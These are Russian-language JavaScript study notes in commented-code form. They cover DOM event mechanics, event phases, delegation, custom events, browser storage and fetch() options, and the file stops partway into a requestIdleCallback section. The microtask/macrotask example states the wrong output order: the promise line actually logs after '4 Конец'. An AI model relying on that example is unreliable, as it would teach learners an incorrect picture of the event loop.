
// ⁡⁢⁣⁢МЕХАНИЗМ РАБОТЫ СОБЫТИЙ В JAVASCRIPT⁡
{
	// 🔳 ⁡⁢⁣⁣ОСНОВНЫЕ ПОНЯТИЯ⁡
	{
		// 🔹 ⁡⁢⁣⁡⁣⁣⁡⁣⁣⁡⁣⁢⁢Событие: (Event) - это сигнал от браузера о том, что что-то произошло (клик, наведение мыши, загрузка страницы и т.д.).⁡
		// 🔹 ⁡⁣⁣⁡⁣⁢⁢Обработчик события: Функция(Event Handler), выполняемая при возникновении события.⁡
		// 🔹 ⁡⁢⁣⁡⁣⁢⁢Целевая область: Элемент, на котором произошло событие.⁡
		// 🔹 ⁡⁣⁢⁢Поток событий: Порядок обработки событий (всплытие и захват).⁡
		// 📋 ⁡⁢⁣⁢ОБЪЕКТ EVENT И ВСЕ ЕГО МЕТОДЫ/СВОЙСТВА⁡
		{
			// ⭐ ⁡⁣⁣⁢Объект Event — это базовый интерфейс для всех событий в DOM. Вот полный список методов и свойств.⁡
			// 🔧 ⁡⁢⁣⁣МЕТОДЫ ОБЪЕКТА EVENT⁡
			{
				// ⁡⁢⁣⁣МЕТОД						ОПИСАНИЕ⁡
				// preventDefault() 			⁡⁣⁣⁢Отменяет стандартное поведение события (например, переход по ссылке)⁡
				// stopPropagation() 			⁡⁣⁣⁢Останавливает всплытие события к родительским элементам⁡
				// stopImmediatePropagation() 	⁡⁣⁣⁢Останавливает всплытие + остальные обработчики на этом элементе⁡
				// composedPath() 				⁡⁣⁣⁢Возвращает массив элементов, через которые прошло событие⁡
				// initEvent() 					⚠️ ⁡⁣⁣⁢Устарел! Инициализирует событие (не рекомендуется)⁡
			}
			// 📌 ⁡⁢⁣⁣ОСНОВНЫЕ СВОЙСТВА⁡
			{
				// ⁡⁢⁣⁣СВОЙСТВО 		ТИП				ОПИСАНИЕ⁡
				// ⁡⁣⁣⁢type 			string 			Тип события ("click", "submit" и т.д.)⁡
				// ⁡⁣⁣⁢target 			Element 		Элемент, который вызвал событие⁡
				// ⁡⁣⁣⁢currentTarget 	Element 		Элемент, на котором сейчас срабатывает обработчик⁡
				// ⁡⁣⁣⁢bubbles 			boolean 		Всплывает ли событие⁡
				// ⁡⁣⁣⁢cancelable 		boolean 		Можно ли отменить событие⁡
				// ⁡⁣⁣⁢defaultPrevented boolean 		Было ли отменено стандартное поведение⁡
				// ⁡⁣⁣⁢eventPhase 		number 			Фаза события (1-capture, 2-target, 3-bubble)⁡
				// ⁡⁣⁡⁣⁣⁢timeStamp 	   	  number 		  Время создания события (мс)⁡
				// ⁡⁣⁣⁢isTrusted 		boolean 		Создано ли событие пользователем (не скриптом)⁡
			}
			// 💡 ⁡⁢⁣⁣ПРИМЕРЫ ИСПОЛЬЗОВАНИЯ⁡
			{
				// ☑️ ⁡⁣⁢⁢preventDefault()⁡
				{
					document.querySelector("form").addEventListener("submit", (e) => {
						e.preventDefault(); // Отменяем отправку формы
						console.log("Форма не отправлена");
					});
				}
				// ☑️ ⁡⁣⁢⁢stopPropagation()⁡
				{
					document.querySelector(".child").addEventListener("click", (e) => {
						e.stopPropagation(); // Останавливаем всплытие
						console.log("Клик по ребёнку");
					});

					document.querySelector(".parent").addEventListener("click", () => {
						console.log("Клик по родителю"); // Не выполнится
					});
				}
				// ☑️ ⁡⁣⁢⁢stopImmediatePropagation()⁡
				{
					element.addEventListener("click", (e) => {
						e.stopImmediatePropagation();
						console.log("Первый обработчик");
					});

					element.addEventListener("click", () => {
						console.log("Второй обработчик"); // Не выполнится
					});
				}
				// ☑️ ⁡⁣⁢⁢composedPath()⁡
				{
					document.addEventListener("click", (e) => {
						console.log(e.composedPath());
						// [target, parent, body, html, document, window]
					});
				}
			}
			// 🎯 ⁡⁢⁣⁣ФАЗЫ СОБЫТИЯ (eventPhase)⁡
			{
				element.addEventListener(
					"click",
					(e) => {
						switch (e.eventPhase) {
							case 1:
								console.log("Capturing");
								break;
							case 2:
								console.log("Target");
								break;
							case 3:
								console.log("Bubbling");
								break;
						}
					},
					true,
				); // true = фаза захвата
				// ⁡⁢⁣⁣ЗНАЧЕНИЕ 			КОНСТАНТА 					ФАЗА⁡
				// ⁡⁣⁣⁢0 					Event.NONE 					Нет активной фазы⁡
				// ⁡⁣⁣⁢1 					Event.CAPTURING_PHASE 		Захват⁡
				// ⁡⁣⁣⁢2 					Event.AT_TARGET 			Цель⁡
				// ⁡⁣⁣⁢3 					Event.BUBBLING_PHASE 		Всплытие⁡
			}
			// 🔥 ⁡⁢⁣⁣СПЕЦИФИЧНЫЕ СВОЙСТВА ДЛЯ ТИПОВ СОБЫТИЙ⁡
			{
				// ☑️ ⁡⁣⁢⁢MouseEvent (клик, мышь)⁡
				{
					element.addEventListener("click", (e) => {
						e.clientX; // X относительно окна
						e.clientY; // Y относительно окна
						e.pageX; // X относительно документа
						e.pageY; // Y относительно документа
						e.button; // Кнопка мыши (0-левая, 1-средняя, 2-правая)
						e.buttons; // Нажатые кнопки
						e.altKey; // Нажат ли Alt
						e.ctrlKey; // Нажат ли Ctrl
						e.shiftKey; // Нажат ли Shift
						e.metaKey; // Нажат ли Meta (Cmd/Win)
					});
				}
				// ☑️ ⁡⁣⁢⁢KeyboardEvent (клавиатура)⁡
				{
					document.addEventListener("keydown", (e) => {
						e.key; // Название клавиши ("Enter", "a")
						e.code; // Код клавиши ("Enter", "KeyA")
						e.keyCode; // ⚠️ Устарел! Код клавиши (13, 65)
						e.charCode; // ⚠️ Устарел! Код символа
						e.repeat; // Зажата ли клавиша
					});
				}
				// ☑️ ⁡⁣⁢⁢InputEvent (ввод)⁡
				{
					input.addEventListener("input", (e) => {
						e.data; // Введённые данные
						e.inputType; // Тип ввода ("insertText", "deleteContentBackward")
						e.isComposing; // Идёт ли ввод через IME
					});
				}
				// ☑️ ⁡⁣⁢⁢SubmitEvent (отправка формы)⁡
				{
					form.addEventListener("submit", (e) => {
						e.submitter; // Элемент, который инициировал отправку
					});
				}
			}
			// ⁡⁢⁣⁣🛠 СОЗДАНИЕ СОБЫТИЙ⁡
			{
				// ☑️ ⁡⁣⁢⁢new Event()⁡
				{
					const event = new Event("custom", {
						bubbles: true,
						cancelable: true,
					});
					element.dispatchEvent(event);
				}
				// ☑️ ⁡⁣⁢⁢new CustomEvent() (с данными)⁡
				{
					const event = new CustomEvent("myEvent", {
						detail: { name: "Андрей", age: 25 },
					});

					element.addEventListener("myEvent", (e) => {
						console.log(e.detail.name); // Андрей
					});

					element.dispatchEvent(event);
				}
			}
			// ⚠️ ⁡⁢⁣⁣УСТАРЕВШИЕ МЕТОДЫ/СВОЙСТВА⁡
			{
				// ⁡⁢⁣⁣УСТАРЕВШЕЕ 					СОВРЕМЕННАЯ ЗАМЕНА⁡
				// ⁡⁣⁣⁢initEvent() 					new Event()⁡
				// ⁡⁣⁣⁢keyCode 						key / code⁡
				// ⁡⁣⁣⁢charCode 					key⁡
				//⁡⁣⁣⁢ layerX, layerY 				offsetX, offsetY⁡
				// ⁡⁣⁣⁢returnValue					preventDefault()⁡
				// ⁡⁣⁣⁢srcElement 					target⁡
			}
			// 📊 ⁡⁢⁣⁣СРАВНЕНИЕ target vs currentTarget⁡
			{
				`<div id="parent">
					<button id="child">Click</button>
				</div>`;
				parent.addEventListener("click", (e) => {
					console.log(e.target); // <button> (где кликнули)
					console.log(e.currentTarget); // <div> (где обработчик)
				});
			}
			// ✅ ⁡⁢⁣⁣ШПАРГАЛКА: ЧТО ИСПОЛЬЗОВАТЬ⁡
			{
				// ⁡⁢⁣⁣ЗАДАЧА 								МЕТОД / СВОЙСТВО⁡
				// ⁡⁣⁣⁢Отменить действие 					preventDefault()⁡
				// ⁡⁣⁣⁢Остановить всплытие 					stopPropagation()⁡
				// ⁡⁣⁣⁢Остановить всё 						stopImmediatePropagation()⁡
				// ⁡⁣⁣⁢Узнать элемент 						target⁡
				// ⁡⁣⁣⁢Узнать тип события 					type⁡
				// ⁡⁣⁣⁢Передать данные 						CustomEvent + detail⁡
				// ⁡⁣⁣⁢Путь события 						composedPath()⁡
			}
		}
	}
	// 🔳⁡⁢⁣⁣ ЦИКЛ РАБОТЫ СОБЫТИЙ (Фаза захвата, Целевая фаза, Фаза всплытия)⁡
	{
		// 🔹 ⁡⁣⁢⁢Возникновение события: Пользовательское действие (клик, нажатие клавиши) или системное событие (загрузка ресурса) генерирует событие.⁡
		// 🔹 ⁡⁢⁣⁡⁣⁡⁣⁢⁢Распространение события: Событие проходит три фазы:⁡
		// ✅ ⁡⁢⁢⁢Фаза захвата (Capture phase) - сверху вниз по DOM-дереву (от родителя к дочернему элементу).⁡
		// ✅ ⁡⁢⁢⁢Целевая фаза (Target phase) - достижение целевого элемента, на котором произошло событие.⁡
		// ✅ ⁡⁢⁢⁢Фаза всплытия (Bubbling phase) - снизу вверх по DOM-дереву (от дочернего элемента к родителю).⁡
		// ⛔ ⁡⁢⁣⁢Чтобы остановить всплытие событий в JavaScript, нужно вызвать метод event.stopPropagation().⁡ ⁡⁢⁣⁢Этот метод препятствует продвижению события дальше, но позволяет доработать всем обработчикам, которые висят на текущем элементе.⁡
		// 🔹 ⁡⁢⁣⁡⁣⁡⁣⁢⁢Вызов обработчиков: Вызываются все зарегистрированные обработчики для данного события.⁡
		// 🔹 ⁡⁣⁢⁢Завершение: После выполнения всех обработчиков событие считается обработанным.⁡
	}
	// 🔳 ⁡⁢⁣⁡⁢⁣⁣ПРИМЕРЫ С РАЗБОРОМ(методы событий, всплытие перехват)⁡
	{
		// 🔹 ⁡⁣⁢⁢ПРОСТОЕ СОБЫТИЕ КЛИКА⁡
		{
			<button id="myButton">Нажми меня</button>;
			// 1. Получаем ссылку на элемент
			const button = document.getElementById("myButton");
			// 2. Добавляем обработчик события 'click'
			button.addEventListener("click", function (event) {
				// 3. Этот код выполнится при клике на кнопку
				console.log("Кнопка была нажата!");
				console.log("Информация о событии:", event);
			});

			// ✅ ⁡⁢⁢⁢При загрузке страницы скрипт получает ссылку на элемент button с id myButton.⁡
			// ✅ ⁡⁢⁢⁢Метод addEventListener регистрирует функцию-обработчик для события 'click'⁡
			// ✅ ⁡⁢⁢⁢При клике на кнопку:⁡
			// ⚡ ⁡⁢⁣⁣Генерируется событие click⁡
			// ⚡ ⁡⁢⁣⁣Вызывается наша функция-обработчик⁡
			// ⚡ ⁡⁢⁣⁣В консоль выводится сообщение и информация о событии (например, координаты клика).⁡
		}
		// 🔹 ⁡⁣⁢⁢ВСПЛЫТИЕ И ПЕРЕХВАТ СОБЫТИЙ⁡
		{
			// Родительский элемент
			<div id="parent">
				<button id="child">Дочерняя кнопка</button>
			</div>;
			const parent = document.getElementById("parent");
			const child = document.getElementById("child");
			// Обработчик на фазе всплытия (по умолчанию)
			parent.addEventListener("click", () => {
				console.log("Родительский элемент - всплытие");
			});
			// Обработчик на фазе перехвата (третий аргумент true)
			parent.addEventListener("click", () => {
					console.log("Родительский элемент - перехват");
				},
				true,
			);
			child.addEventListener("click", () => {
				console.log("Дочерняя кнопка");
			});
			// ✅ ⁡⁢⁢⁢При клике на кнопку порядок вывода в консоль будет:⁡
			// ⚡ ⁡⁢⁣⁣"Родительский элемент - перехват" (фаза захвата)⁡
			// ⚡ ⁡⁣⁣⁡⁢⁣⁣"Дочерняя кнопка" (целевая фаза)⁡
			// ⚡ ⁡⁢⁣⁣"Родительский элемент - всплытие" (фаза всплытия)⁡
		}
		// 🔹 ⁡⁣⁢⁢ОТМЕНА СТАНДАРТНОГО ПОВЕДЕНИЯ⁡
		{
			const link = document.getElementById("myLink");
			link.addEventListener("click", function (event) {
				// Отменяем стандартное поведение (переход по ссылке)
				event.preventDefault();
				console.log("Переход по ссылке отменён");
				// Можем выполнить что-то другое вместо перехода
			});
			// ✅ ⁡⁢⁢⁢Обычно клик по ссылке вызывает переход по URL⁡
			// ✅ ⁡⁢⁢⁢event.preventDefault() предотвращает это поведение⁡
			// ✅ ⁡⁢⁢⁢Теперь при клике будет только вывод в консоль⁡
		}
		// 🔹 ⁡⁣⁢⁢МЕТОДЫ СОБЫТИЙ⁡
		{
			// ✅ ⁡⁢⁢⁢event.preventDefault() - отменяет стандартное поведение⁡
			// ✅ ⁡⁢⁢⁢event.stopPropagation() - Останавливает дальнейшее всплытие (bubbling) события вверх по DOM-дереву(Когда вы хотите, чтобы событие не достигало родительских элементов)⁡
			{
				childElement.addEventListener("click", function (event) {
					event.stopPropagation();
					// Родительские элементы не получат это событие
				});
			}
			// ✅ ⁡⁢⁢⁢event.stopImmediatePropagation() - Останавливает всплытие И предотвращает вызов других обработчиков этого же события на текущем элементе(Когда нужно не только остановить всплытие, но и убедиться, что другие обработчики на этом же элементе не сработают)⁡
			{
				element.addEventListener("click", function (event) {
					event.stopImmediatePropagation();
					// Ни другие обработчики на этом элементе, ни родительские элементы не получат событие
				});
				// Этот обработчик никогда не выполнится, если сработал предыдущий
				element.addEventListener("click", function () {
					console.log("Это никогда не выполнится");
				});
			}
		}
	}
	// 🔳 ⁡⁢⁣⁣ДЕЛЕГИРОВАНИЕ СОБЫТИЙ⁡
	{
		// 🔹 ⁡⁣⁢⁢ЭФФЕКТИВНЫЙ СПОСОБ РАБОТЫ С МНОЖЕСТВОМ ЭЛЕМЕНТОВ:⁡
		{
			<ul id="myList">
				<li>Элемент 1</li>
				<li>Элемент 2</li>
				<li>Элемент 3</li>
			</ul>;
			const list = document.getElementById("myList");
			// Вешаем обработчик на родителя, а не на каждый li
			list.addEventListener("click", function (event) {
				// event.target - элемент, на котором произошло событие
				if (event.target.tagName === "LI") {
					console.log("Клик по элементу:", event.target.textContent);
				}
			});
			// ✅ ⁡⁢⁢⁢Не нужно вешать обработчики на каждый элемент⁡
			// ✅ ⁡⁢⁢⁢Работает даже для динамически добавленных элементов⁡
		}
	}
	// 🔳 ⁡⁢⁣⁣ПОЛЬЗОВАТЕЛЬСКИЕ СОБЫТИЯ⁡
	{
		// 🔹 ⁡⁣⁢⁢JAVASCRIPT ПОЗВОЛЯЕТ СОЗДАВАТЬ И ГЕНЕРИРОВАТЬ СОБСТВЕННЫЕ СОБЫТИЯ:⁡
		{
			// Создание пользовательского события
			const myEvent = new CustomEvent("myCustomEvent", {
				detail: { message: "Это моё событие!" },
				bubbles: true,
				cancelable: true,
			});
			// Подписка на событие
			document.addEventListener("myCustomEvent", (e) => {
				console.log("Получено пользовательское событие:", e.detail.message);
			});
			// Генерация события
			document.dispatchEvent(myEvent);
		}
	}
	// 🔳 ⁡⁢⁣⁣МИКРОТАСКИ И МАКРОТАСКИ В СОБЫТИЙНОМ ЦИКЛЕ⁡
	{
		// 🔹 ⁡⁣⁢⁢ВАЖНО ПОНИМАТЬ, КАК СОБЫТИЯ ВЗАИМОДЕЙСТВУЮТ С ОЧЕРЕДЯМИ JAVASCRIPT:⁡
		{
			console.log("1 Старт"); // Синхронный код
			setTimeout(() => console.log("5 setTimeout"), 0); // Ассинхронный код, макрозадача
			button.addEventListener("click", () => {
				Promise.resolve().then(() => console.log("3 Promise внутри события")); // Ассинхронный код, микрозадача
				console.log("2 Обработчик события"); // Синхронный код
			});
			button.click();
			console.log("4 Конец");
			// ⁡⁣⁣⁢Вывод:⁡
			// 1 Старт
			// 2 Обработчик события
			// 3 Promise внутри события
			// 4 Конец
			// 5 setTimeout
		}
		// 🔹 ⁡⁣⁢⁢РАЗБОР⁡
		// ✅ ⁡⁢⁢⁢Синхронный код выполняется первым⁡
		// ✅ ⁡⁢⁢⁢Обработчик события выполняется сразу при вызове click()⁡
		// ✅ ⁡⁢⁢⁢Promise (микротаска) выполняется перед следующей макротаской⁡
		// ✅ ⁡⁢⁢⁢setTimeout (макротаска) выполняется последним⁡
	}
	// 🔳 ⁡⁢⁣⁣ЗАКЛЮЧЕНИЕ⁡
	{
		// 🔹 ⁡⁣⁢⁢МЕХАНИЗМ СОБЫТИЙ В JAVASCRIPT - ЭТО МОЩНАЯ СИСТЕМА, КОТОРАЯ:⁡
		// ✅ ⁡⁢⁢⁢Позволяет реагировать на действия пользователя⁡
		// ✅ ⁡⁢⁢⁢Имеет четкий порядок выполнения (захват-цель-всплытие)⁡
		// ✅ ⁡⁢⁢⁢Поддерживает делегирование для эффективной работы⁡
		// ✅ ⁡⁢⁢⁢Интегрируется с общей моделью выполнения JavaScript (event loop)⁡
		// 🔹 ⁡⁣⁢⁢ПОНИМАНИЕ ЭТОГО МЕХАНИЗМА КРИТИЧЕСКИ ВАЖНО ДЛЯ СОЗДАНИЯ ИНТЕРАКТИВНЫХ ВЕБ-ПРИЛОЖЕНИЙ.⁡
	}
}
// ⁡⁢⁣⁢БРАУЗЕРНЫЕ API⁡
{
	// 🔸 ⁡⁢⁣⁡⁢⁣⁣ОСНОВНЫЕ МЕТОДЫ API БРАУЗЕРА (Таблица)⁡
	{
		// ⁡⁣⁣⁢API	                     ОСНОВНОЕ НАЗНАЧЕНИЕ	             КОГДА ИСПОЛЬЗОВАТЬ⁡
		// ⁡⁣⁢⁡⁣⁢⁢IntersectionObserver()⁡⁡    ⁡⁢⁣⁣Видимость элементов                 Ленивая загрузка, аналитика⁡
		// ⁡⁣⁢⁢ResizeObserver⁡            ⁡⁢⁣⁣Изменение размеров элементов⁡        ⁡⁢⁣⁣Адаптивный дизайн⁡
		// ⁡⁣⁢⁡⁣⁢⁢MutationObserver ⁡         ⁡⁢⁣⁣Отслеживание изменений DOM          Динамические интерфейсы⁡
		// ⁡⁣⁢⁢Fetch()⁡                   ⁡⁢⁣⁣Сетевые запросы                     Работа с REST API, загрузка данных⁡
		// ⁡⁣⁢⁢Web Workers⁡               ⁡⁢⁣⁣Многопоточность                     Тяжелые вычисления⁡
		// ⁡⁣⁢⁢Geolocation⁡               ⁡⁢⁣⁣Геопозиция                          Карты, локализация⁡
		// ⁡⁣⁢⁢History API⁡               ⁡⁢⁣⁣Управление историей⁡                 ⁡⁢⁣⁣SPA, динамические URL⁡
		// ⁡⁣⁢⁢Clipboard⁡                 ⁡⁢⁣⁣Работа с буфером обмена⁡             ⁡⁢⁣⁣Копирование/вставка⁡
		// ⁡⁣⁢⁢Service Workers⁡           ⁡⁢⁣⁣Оффлайн-режим, кэширование          PWA, фоновая синхронизация⁡
		// ⁡⁣⁢⁢WebSocket⁡                 ⁡⁢⁣⁣Реальное время                      Чаты, онлайн-игры⁡
		// ⚪ ⁡⁣⁣⁢Советы⁡
		// 🔹 ⁡⁢⁣⁣Всегда проверяйте поддержку API через if ('apiName' in window).⁡
		// 🔹 ⁡⁢⁣⁣Используйте полифиллы для старых браузеров (например, core-js).⁡
		// 🔹 ⁡⁢⁣⁣Оптимизируйте использование API (например, отключайте ненужные наблюдатели).⁡
		// 🔹 ⁡⁢⁣⁣Комбинируйте API: например, fetch + Service Worker для оффлайн-кэширования.⁡
		// ⚪ ⁡⁣⁣⁢Подробно:⁡
		// 🔹 ⁡⁣⁢⁢Service Worker⁡ ⁡⁣⁣⁢— это скрипт, который работает в фоновом режиме и действует как посредник между веб-приложением и сетью. Он перехватывает сетевые запросы, управляет кэшированием и обеспечивает работу приложения в офлайн-режиме.⁡
		// 🔹 ⁡⁣⁢⁢Web Worker⁡ ⁡⁣⁣⁢— это механизм, позволяющий выполнять JavaScript-код в отдельном фоновом потоке, не блокируя основной поток пользовательского интерфейса. Это позволяет избежать «зависания» интерфейса при выполнении ресурсоёмких задач.⁡
	}
	// ⁡⁢⁣⁣🔸 ОСНОВНЫЕ ТИПЫ КЛИЕНТСКОГО ХРАНЕНИЯ ДАННЫХ⁡
	{
		// 🔵 ⁡⁣⁢⁢COOKIES (КУКИ)⁡
		{
			// ⁡⁣⁣⁢Описание Небольшие текстовые файлы (до 4 КБ), привязанные к домену⁡
			// ⁡⁣⁣⁢Назначение⁡
			// ⁡⁢⁣⁣-- Аутентификация (сессии)⁡
			// ⁡⁢⁣⁣-- Персонализация (настройки пользователя)⁡
			// ⁡⁢⁣⁣-- Трекинг (аналитика)⁡
			{
				// Запись
				document.cookie = "username=John; max-age=3600; path=/; Secure";
				// Чтение
				const cookies = document.cookie.split("; ");
			}
			// ⁡⁣⁣⁢Безопасность⁡
			// ⁡⁢⁣⁣-- Уязвимы к XSS и CSRF-атакам⁡
			// ⁡⁢⁣⁣-- Используйте флаги⁡
			{
				("SameSite=Strict; HttpOnly; Secure");
			}
		}
		// 🔵 ⁡⁣⁢⁢WEB STORAGE (LOCALSTORAGE И SESSIONSTORAGE)⁡
		{
			// ⁡⁣⁣⁢Описание: Хранилище ключ-значение (до 5-10 МБ в зависимости от браузера).⁡
			// ⁡⁢⁣⁣-- localStorage: данные сохраняются навсегда⁡
			// ⁡⁢⁣⁣-- sessionStorage: данные удаляются при закрытии вкладки⁡
			{
				// Запись
				localStorage.setItem("theme", "dark");
				sessionStorage.setItem("tempData", JSON.stringify({ id: 42 }));
				// Чтение
				const theme = localStorage.getItem("theme");
			}
			// ⁡⁣⁣⁢Безопасность⁡
			// ⁡⁢⁣⁣-- Доступны только через JavaScript⁡
			// ⁡⁢⁣⁣-- Уязвимы к XSS-атакам⁡
			// ⁡⁢⁣⁣-- Не храните токены или пароли!⁡
		}
		// 🔵 ⁡⁣⁢⁢INDEXEDDB⁡
		{
			// ⁡⁣⁣⁢Описание: NoSQL-база данных для сложных структур (до 50% свободного места на диске).⁡
			// ⁡⁢⁣⁣-- Оффлайн-приложения⁡
			// ⁡⁢⁣⁣-- Кэширование больших данных⁡
			// ⁡⁢⁣⁣-- Хранение файлов и бинарных данных⁡
			{
				const request = indexedDB.open("myDatabase", 1);
				request.onsuccess = (e) => {
					const db = e.target.result;
					const tx = db.transaction("books", "readwrite");
					tx.objectStore("books").add({ id: 1, title: "JS Guide" });
				};
			}
			// ⁡⁣⁣⁢Безопасность⁡
			// ⁡⁢⁣⁣-- Данные изолированы по origin⁡
			// ⁡⁢⁣⁣-- Требует явного разрешения для больших объемов⁡
		}
		// 🔵 ⁡⁣⁢⁢CACHE API⁡
		{
			// ⁡⁣⁣⁢Описание: Хранилище для кэширования сетевых запросов (часть Service Workers).⁡
			// ⁡⁢⁣⁣-- Оффлайн-доступ⁡
			// ⁡⁢⁣⁣-- Ускорение загрузки ресурсов⁡
			{
				caches.open("my-cache").then((cache) => {
					cache.addAll(["/style.css", "/logo.png"]);
				});
			}
			// ⁡⁣⁣⁢Безопасность⁡
			// ⁡⁢⁣⁣-- Только для HTTPS в production⁡
			// ⁡⁢⁣⁣-- Проверяйте целостность кэшированных ресурсов⁡
		}
		//
	}
	// 🔸 ⁡⁢⁣⁣МЕТОДЫ ( fetch(), requestIdleCallback(), requestAnimationFrame(), setTimeout(), setInterval())⁡
	{
		// 🔵⁡ ⁡⁣⁢⁢Fetch(url, options)⁡
		{
			// ⭐ ⁡⁣⁣⁢url — строка с адресом запроса (например, 'https://api.example.com/data').⁡
			// ⭐ ⁡⁣⁣⁢options (необязательный объект) — настройки запроса.⁡
			// 🔳 ⁡⁢⁡⁢⁣⁣ОСНОВНЫЕ ПАРАМЕТРЫ(OPTIONS)⁡
			{
				// ☑️ ⁡⁣⁢⁢method⁡
				{
					// ⁡⁢⁢⁢HTTP‑метод запроса:⁡ 'GET', 'POST', 'PUT', 'DELETE', 'PATCH' и др.
					// ⁡⁢⁢⁢По умолчанию:⁡ 'GET'.
				}
				// ☑️ ⁡⁣⁢⁢headers⁡
				{
					// ⁡⁢⁢⁢Объект с HTTP‑заголовками (или экземпляр Headers). Пример:⁡
					headers: {
						// 'Content-Type': 'application/json',
						// 'Authorization': 'Bearer token123'
					}
				}
				// ☑️ ⁡⁣⁢⁢body⁡
				{
					// ⁡⁢⁢⁢Тело запроса (данные для отправки). Поддерживаемые типы:⁡
					// 🔸 ⁡⁢⁣⁣string (например, JSON‑строка),⁡
					// 🔸 ⁡⁢⁣⁣FormData,⁡
					// 🔸 ⁡⁢⁣⁣Blob,⁡
					// 🔸 ⁡⁢⁣⁣BufferSource (Uint8Array и др.),⁡
					// 🔸 ⁡⁢⁣⁣URLSearchParams,⁡
					// 🔸 ⁡⁢⁣⁣ReadableStream.⁡
					// ⁡⁣⁣⁢Примечание: для методов GET и HEAD параметр body недопустим.⁡
				}
			}
			// 🔳 ⁡⁢⁣⁣ПАРАМЕТРЫ БЕЗОПАСНОСТИ И CORS(OPTIONS)⁡
			{
				// ☑️ ⁡⁣⁢⁢credentials⁡
				{
					// ⁡⁢⁢⁢Управление отправкой учётных данных (куки, HTTP‑аутентификация). Возможные значения:⁡
					// 🔸 ⁡⁢⁣⁣'omit' — не отправлять и не принимать учётные данные,⁡
					// 🔸 ⁡⁢⁣⁣'same-origin' — отправлять только для запросов к тому же домену,⁡
					// 🔸 ⁡⁢⁣⁣'include' — отправлять для любых запросов (включая кросс‑доменные).⁡
					// ⁡⁣⁣⁢По умолчанию: 'same-origin'.⁡
				}
				// ☑️ ⁡⁣⁢⁢mode⁡
				{
					// ⁡⁢⁢⁢Режим CORS. Возможные значения:⁡
					// 🔸 ⁡⁢⁣⁣'cors' — разрешить кросс‑доменные запросы с проверкой CORS,⁡
					// 🔸 ⁡⁢⁣⁣'no-cors' — разрешить только безопасные методы (GET, HEAD, POST) без проверки CORS,⁡
					// 🔸 ⁡⁢⁣⁣'same-origin' — запретить кросс‑доменные запросы.⁡
					// ⁡⁣⁣⁢По умолчанию: 'cors'⁡
				}
			}
			// 🔳 ⁡⁢⁣⁡⁢⁣⁣УПРАВЛЕНИЕ КЭШИРОВАНИЕМ(OPTIONS)⁡
			{
				// ☑️ ⁡⁣⁢⁢cache⁡
				{
					// ⁡⁢⁢⁢Стратегия работы с кэшем. Возможные значения:⁡
					// 🔸 ⁡⁢⁣⁣'default' — использовать настройки браузера,⁡
					// 🔸 ⁡⁢⁣⁣'no-store' — не кэшировать,⁡
					// 🔸 ⁡⁢⁣⁣'reload' — запросить данные заново (игнорировать кэш),⁡
					// 🔸 ⁡⁢⁣⁣'no-cache' — проверить актуальность данных в кэше,⁡
					// 🔸 ⁡⁢⁣⁣'force-cache' — использовать кэш, даже если он устарел,⁡
					// 🔸 ⁡⁢⁣⁣'only-if-cached' — использовать только кэш (если нет — ошибка).⁡
					// ⁡⁣⁣⁢По умолчанию: 'default'.⁡
				}
			}
			// 🔳 ⁡⁢⁣⁣ОБРАБОТКА РЕДИРЕКТОВ(OPTIONS)⁡
			{
				// ☑️ ⁡⁣⁢⁢redirect⁡
				{
					// ⁡⁢⁢⁢Как реагировать на редиректы. Возможные значения:⁡
					// 🔸 ⁡⁢⁣⁣'follow' — автоматически переходить по редиректу,⁡
					// 🔸 ⁡⁢⁣⁣'error' — вызвать ошибку при редиректе,⁡
					// 🔸 ⁡⁢⁣⁣'manual' — вернуть ответ с редиректом для ручной обработки.⁡
					// ⁡⁣⁣⁢По умолчанию: 'follow'.⁡
				}
			}
			// 🔳 ⁡⁢⁣⁣ДОПОЛНИТЕЛЬНЫЕ ПАРАМЕТРЫ(OPTIONS)⁡
			{
				// ☑️ ⁡⁣⁢⁢referrer⁡
				{
					// 🔸 ⁡⁢⁣⁣Значение заголовка Referer (строка).⁡
				}
				// ☑️ ⁡⁣⁢⁢referrerPolicy⁡
				{
					// ⁡⁢⁢⁢Политика отправки Referer. Возможные значения:⁡
					// 🔸 ⁡⁢⁣⁣'no-referrer',⁡
					// 🔸 ⁡⁢⁣⁣'no-referrer-when-downgrade',⁡
					// 🔸 ⁡⁢⁣⁣'same-origin',⁡
					// 🔸 ⁡⁢⁣⁣'origin',⁡
					// 🔸 ⁡⁢⁣⁣'strict-origin',⁡
					// 🔸 ⁡⁢⁣⁣'origin-when-cross-origin',⁡
					// 🔸 ⁡⁢⁣⁣'strict-origin-when-cross-origin'⁡,
					// 🔸 ⁡⁢⁣⁣'unsafe-url'.⁡
				}
				// ☑️ ⁡⁣⁢⁢integrity⁡
				{
					// 🔸 ⁡⁢⁣⁣Строка с криптографическим хэшем ресурса (для проверки целостности).⁡
				}
				// ☑️ ⁡⁣⁢⁢keepalive⁡
				{
					// 🔸 ⁡⁢⁣⁣boolean — разрешить запросу выполняться дольше, чем живёт страница.⁡
					// ⁡⁣⁣⁢По умолчанию: false.⁡
				}
				// ☑️ ⁡⁣⁢⁢signal⁡
				{
					// 🔸 ⁡⁢⁣⁣Объект AbortSignal для отмены запроса (через AbortController).⁡
				}
			}
			// 🔳 ⁡⁢⁣⁣ПРИМЕР ПОЛНОГО ЗАПРОСА⁡
			{
				fetch("https://api.example.com/users", {
					method: "POST",
					headers: {
						"Content-Type": "application/json",
						Authorization: "Bearer token123",
					},
					body: JSON.stringify({ name: "Alice" }),
					credentials: "include",
					mode: "cors",
					cache: "no-cache",
					redirect: "follow",
					signal: abortController.signal, // для отмены запроса
				})
					.then((response) => response.json())
					.catch((error) => console.error("Ошибка:", error));
			}
			// 🔳 ⁡⁢⁣⁣ВАЖНЫЕ ЗАМЕЧАНИЯ⁡
			{
				// ☑️ ⁡⁣⁢⁢fetch() возвращает промис, который разрешается объектом Response.⁡
				// ☑️ ⁡⁣⁢⁢Для чтения тела ответа используйте методы:⁡
				{
					// 🔸 ⁡⁢⁣⁣response.json() — для JSON,⁡
					// 🔸 ⁡⁢⁣⁣response.text() — для текста,⁡
					// 🔸 ⁡⁢⁣⁣response.blob() — для бинарных данных,⁡
					// 🔸 ⁡⁢⁣⁣response.formData() — для форм,⁡
					// 🔸 ⁡⁢⁣⁣response.arrayBuffer() — для низкоуровневых данных.⁡
				}
				// ☑️ ⁡⁣⁢⁢fetch() не бросает ошибки для HTTP‑статусов (404, 500 и т. п.) — проверяйте response.ok или response.status.⁡
				// ☑️ ⁡⁣⁢⁢Для отмены запроса используйте AbortController и параметр signal.⁡
			}
		}
		// 🔵 ⁡⁣⁢⁢requestIdleCallback()⁡
		{
